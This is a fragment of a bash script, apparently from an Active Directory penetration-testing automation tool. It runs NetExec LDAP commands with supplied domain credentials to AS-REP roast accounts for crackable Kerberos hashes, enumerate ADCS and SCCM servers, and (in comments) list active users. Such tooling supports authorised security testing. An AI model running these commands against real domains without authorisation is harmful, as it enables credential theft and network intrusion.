	printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --asreproast '$OUTPUTDIR/nxc_asreproast.out' --threads $NETEXECTHREADS" "$MODE" "nxc_asreproast.log"


	# List ADCS servers
	logger "
[*] Fetching ADCS servers..." "yellow"
	printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M adcs --threads $NETEXECTHREADS" "$MODE" "nxc_adcs.out"
	# List SCCM config
	logger "
[*] Fetching SCCM configs..." "yellow"
	printOrExecute "$NETEXEC ldap '$DCIP' -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' -M sccm --threads $NETEXECTHREADS" "$MODE" "nxc_sccm.out"

	# nxc ldap $DCIP -u '$DOMAIN\\$USERNAME' -p '$PASSWORD' -d '$TARGETDOMAIN' --active-users | tee nxc_active-users.out
	# cut -d ' ' -f 35 ./nxc_active-users.out | grep -v '[+]' | grep -v [*] | grep -v '-Username-' | sort -u > nxc_active-users.out.list
	# tr '[:upper:]' '[:lower:]' < nxc_active-users.out.list | sort -u > nxc_active-users.out.list2
